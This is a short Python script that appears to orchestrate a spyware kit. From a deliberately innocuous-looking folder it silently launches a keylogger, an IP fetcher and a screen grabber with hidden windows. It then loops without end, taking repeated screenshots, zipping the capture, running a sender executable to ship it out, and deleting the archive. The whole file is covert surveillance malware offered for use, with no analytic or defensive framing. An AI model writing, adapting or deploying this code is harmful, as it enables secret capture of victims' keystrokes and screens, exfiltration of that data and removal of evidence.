import shutil
import os
import sys
import time
import subprocess

directory=r'C:/TOTALLYNOTHINGSUSPICIOUS'
cwd=directory

subprocess.Popen([directory+'/'+'Keylogger.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)
subprocess.Popen([directory+'/'+'IP_fetcher.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)
subprocess.Popen([directory+'/'+'Screen_grabber.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)

stop=0
while stop==0:
    for i in range(0,30):
        time.sleep(20)
        subprocess.Popen([directory+'/'+'Screen_grabber.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)
    time.sleep(5)
    subprocess.Popen([directory+'/'+'Zipper.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)        
    time.sleep(10)
    subprocess.Popen([directory+'/'+'Sender.exe'],stdout=subprocess.PIPE,creationflags=0x08000000)        
    time.sleep(10)
    try:
        os.remove(cwd+'/'+'data.zip')
    except:
        pass

